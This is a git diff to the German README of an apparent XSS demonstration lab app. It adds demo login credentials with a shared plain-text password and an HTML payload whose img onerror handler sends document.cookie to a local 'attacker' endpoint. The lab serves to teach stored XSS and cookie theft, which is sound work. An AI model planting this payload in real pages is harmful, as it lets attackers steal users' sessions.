@@ -94,7 +94,22 @@ Diese Webanwendung bietet die Möglichkeit, zwischen verschiedenen Branches zu w
 ## Anmerkung
 
 Die Payloads sind ebenfalls in der Datei `xss_payload.txt` zu finden. Diese Datei befindet sich im Verzeichnis `Attacker/src/xss_payload.txt`.
+Zum Einlogen in die Seite kann sowohl: 
+```bash
+name: Admin password:abcABC123! 
+```
+```bash 
+name: User password:abcABC123! und 
+``` 
+und für das Biografiefeld:
+```html
+<b>Willkommen auf meiner Seite!</b> <img src="https://i.imgur.com/6Rv8Pp9.gif"/> 
+```
+und wenn man dass XSS haben möchte
 
+```html
+<img src="invalid_image.png" onerror="this.src='http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);">
+```
 
 ## Lizenz
 Dieses Projekt ist unter der MIT-Lizenz lizenziert.
